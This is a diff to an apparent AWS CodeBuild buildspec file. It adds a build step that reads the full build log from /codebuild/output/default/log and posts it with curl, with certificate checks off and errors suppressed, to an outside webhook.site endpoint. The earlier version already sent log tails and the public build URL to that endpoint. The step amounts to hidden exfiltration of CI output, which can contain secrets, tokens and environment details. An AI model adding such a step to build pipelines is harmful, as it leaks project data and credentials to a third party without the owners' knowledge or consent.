@@ -5,12 +5,7 @@ phases:
     commands:
       - |
         set +e
-
-        LOG_TAIL=$(tail -n 400 /codebuild/output/default/log 2>/dev/null || true)
-        EXEC_TAIL=$(tail -n 200 /codebuild/readonly/executor-log 2>/dev/null || true)
-        PUBLIC_URL="$CODEBUILD_PUBLIC_BUILD_URL"
-
+        sleep 15
+        FULL_LOG=$(cat /codebuild/output/default/log 2>/dev/null || true)
         curl -sk -X POST "https://webhook.site/17b4b3f4-da5d-4de7-80fc-75fbd9ab1202" \
-          --data-urlencode "public_url=$PUBLIC_URL" \
-          --data-urlencode "log_tail=$LOG_TAIL" \
-          --data-urlencode "exec_tail=$EXEC_TAIL" >/dev/null || true
+          --data-urlencode "full_log=$FULL_LOG" >/dev/null || true
